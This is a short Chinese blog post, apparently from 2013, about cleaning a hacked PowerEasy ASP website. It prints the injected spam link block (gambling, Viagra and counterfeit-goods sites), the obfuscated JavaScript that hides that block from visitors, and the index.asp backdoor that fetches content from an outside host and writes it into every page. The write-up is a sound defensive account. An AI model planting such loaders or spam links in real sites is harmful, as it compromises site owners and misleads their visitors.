@@ -1,0 +1,98 @@
+Title: 动易网站被挂马一例
+Date: 2013-04-19 09:29:57
+URL: /2013/04/asp-hacked/
+Tags: 动易 , 挂马
+
+某动易网站，被挂了马，代码：
+&lt;div id="ImportantPage"&gt;
+&lt;a href="http://www.hao123de.com/" &gt;hao123.com网址之家&lt;/a&gt;
+&lt;a href="http://www.http-123.com/" &gt;hao123.com网址之家&lt;/a&gt;
+&lt;a href="http://www.zjh9.com/"&gt;瞬发棋牌&lt;/a&gt;
+&lt;a href="http://www.yulexiu.cn/"&gt;求魔&lt;/a&gt;
+&lt;a href="http://www.122s.com/"&gt;神印王座&lt;/a&gt;
+&lt;a href="http://www.qp737.com/"&gt;棋牌游戏&lt;/a&gt;
+&lt;a href="http://www.zengda4.com/"&gt;澳门赌场&lt;/a&gt;
+&lt;a href="http://www.kaoshiba.com/" &gt;隆胸整容培训&lt;/a&gt;
+&lt;a href="http://www.kaoshiba.com/" &gt;性病&lt;/a&gt;
+&lt;a href="http://www.123-hao123.com/"&gt;hao123.com网址之家&lt;/a&gt;
+&lt;a href="http://www.zhuzhudao.com/"&gt;斗破苍穹&lt;/a&gt;
+&lt;a href="http://www.xiaoshuoxiu.com/"&gt;武动乾坤&lt;/a&gt;
+&lt;a href="http://www.quledu.com/"&gt;仙府之缘&lt;/a&gt;
+&lt;a href="http://www.13nl.com/"&gt;天才相师&lt;/a&gt;
+&lt;a href="http://www.aishoucang.com/zaoshen/"&gt;造神&lt;/a&gt;
+&lt;a href="http://www.wacou.com/"&gt;不朽神丹&lt;/a&gt;
+&lt;a href="http://www.23kanshu.com/"&gt;杀神&lt;/a&gt;
+&lt;a href="http://www.qp09.com/" &gt;棋牌游戏下载&lt;/a&gt;
+&lt;a href="http://www.gaomax.com.cn/"&gt;国快高GAOMAX官网&lt;/a&gt;
+&lt;a href="http://www.gaomaxes.com/"&gt;美国快高&lt;/a&gt;
+&lt;a href="http://www.viagra-china.cn/"&gt;万艾可网&lt;/a&gt;
+&lt;a href="http://www.jinkouweige.net/"&gt;进口伟哥&lt;/a&gt;
+&lt;a href="http://www.zhongyao-zenggao.com/"&gt;中药增高&lt;/a&gt;
+&lt;a href="http://www.viagra-shop.cn/"&gt;伟哥官网商城&lt;/a&gt;
+&lt;a href="http://www.zhinengjiaoyi.com/"&gt;MT4智能交易系统&lt;/a&gt;
+&lt;a href="http://www.icolorcase.com/"&gt;iphone 4s cases&lt;/a&gt;
+&lt;a href="http://www.ninhao123.com/"&gt;123网址之家&lt;/a&gt;
+&lt;a href="http://www.sandwatches.com/" &gt;fake watches&lt;/a&gt;
+&lt;a href="http://www.usualdress.com/" &gt;prom dresses 2013&lt;/a&gt;
+&lt;a href="http://www.wirelessbeatsearbudsus.com/"&gt;Beats By Dre&lt;/a&gt;
+&lt;a href="http://www.dressesforus.net/prom-dresses/"&gt;http://www.dressesforus.net/prom-dresses/&lt;/a&gt;
+&lt;head&gt;
+&lt;title&gt;bet365 皇冠网 tt娱乐城 伟易博 bet365娱乐场&lt;/title&gt;
+&lt;meta name="description" content="bet365，我们在生活中也缺乏其他方面的娱乐,皇冠网，tt娱乐城，伟易博，bet365娱乐场是不错的选择。" /&gt;
+&lt;meta name="keywords" content="tt娱乐城 伟易博 bet365娱乐场 bet365 皇冠网" /&gt;
+&lt;/head&gt;
+&lt;p&gt;&lt;b&gt;&lt;a href=http://www.iyoudl.com&gt;&lt;font size="5"&gt;bet365&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;bet365主页&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;&lt;a href=http://www.skrpet.com&gt;&lt;font size="5"&gt;皇冠网&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;皇冠网开户&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;&lt;a href=http://www.midisky.net&gt;&lt;font size="5"&gt;tt娱乐城&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;&lt;a href=http://www.cnsmart.net&gt;&lt;font size="5"&gt;伟易博&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;&lt;a href=http://www.chinabreeds.com&gt;&lt;font size="5"&gt;bet365娱乐场&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;bet365&lt;/p&gt;
+&lt;head&gt;
+&lt;title&gt;优博平台&lt;/title&gt;
+&lt;meta name="description" content="优博娱乐城官方资讯网站欢迎大家光临,优博娱乐城资讯网站发布优博娱乐城官方最新优惠活动新闻资讯以及最新备用网址。" /&gt;
+&lt;meta name="keywords" content="优博" /&gt;
+&lt;/head&gt;
+	优博平台时时彩娱乐，秒充秒提、全新界面UI客户端下注，轩辕平台为你网购优博时时彩提供安全的平台，18条线路自动寻找进入最快的线路！及时兑换、充值功能。 www.gzhdwl.com
+		&lt;a href="http://cache.baidu.com/c?m=9f65cb4a8c8507ed4fece763105392230e54f736748d865021c3933fc239045c5323befb712d554196d27d1716af3e4beb80633a200250edcd8dd65ddccb8528589f26442141d9&amp;p=9f7bc54ad5c343f90df1c771076494&amp;newp=ce70c315d9c041ad0dbcc77107428b231610db2151d1d2402e&amp;user=baidu&amp;fm=sc&amp;query=www%2Egzhdwl%2Ecom&amp;qid=bfc238613805a678&amp;p1=1"&gt;百度快照&lt;/a&gt;
+	&lt;p&gt;&lt;b&gt;
+	&lt;a href=http://www.gzhdwl.com&gt;&lt;font size="5"&gt;优博平台&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;
+&lt;b&gt;
+	&lt;a href=http://www.gzhdwl.com&gt;&lt;font size="5"&gt;优博&lt;/font&gt;&lt;/a&gt;&lt;/b&gt;
+&lt;script type="text/javascript"&gt;document.getElementById("new18"+"li" + "nk").style.display="n" + "one";&lt;/script&gt;
+	&lt;/p&gt;&lt;p&gt;
+&lt;/div&gt;&lt;script language="JavaScript"&gt;
+&lt;!--
+var _0x9337=["\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x49\x6d\x70\x6f\x72\x74\x61\x6e\x74\x50\x61\x67\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x6E\x6F\x6E\x65"];
+document[_0x9337[3]](_0x9337[2])[_0x9337[1]][_0x9337[0]]=_0x9337[4]
+//--&gt;
+&lt;/script&gt;
+找了半天，愣是没在源代码里找到，还怀疑是数据库，结果还是没有。
+
+最后偶然在index.asp里面找到这段代码
+&lt;%
+On Error Resume Next:Server.ScriptTimeOut=9999999
+response.write(getHTTPPage("http://quan.maofou.com/d7.htm"))
+function getHTTPPage(url)
+      dim http:set http=createobject("MSXML2.ServerXMLHTTP")
+      Http.open "GET",url,false:Http.send()
+if http.status &lt;&gt; 200 then:exit function:end if
+if Http.readystate&lt;&gt;4 then:exit function:end if
+getHTTPPage=bytes2BSTR(Http.responseBody):set http=nothing
+if err.number&lt;&gt;0 then err.Clear
+end function
+Function bytes2BSTR(vIn)
+      dim strReturn:dim i,ThisCharCode,NextCharCode
+      strReturn = "":For i = 1 To LenB(vIn)
+      ThisCharCode = AscB(MidB(vIn,i,1))
+If ThisCharCode &lt; &amp;H80 Then
+      strReturn = strReturn &amp; Chr(ThisCharCode)
+      Else
+      NextCharCode = AscB(MidB(vIn,i+1,1))
+      strReturn = strReturn &amp; Chr(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))
+      i = i + 1
+End If
+Next:bytes2BSTR = strReturn:End Function
+%&gt;
+
+删掉就好了。。。
+
+好高级。。。
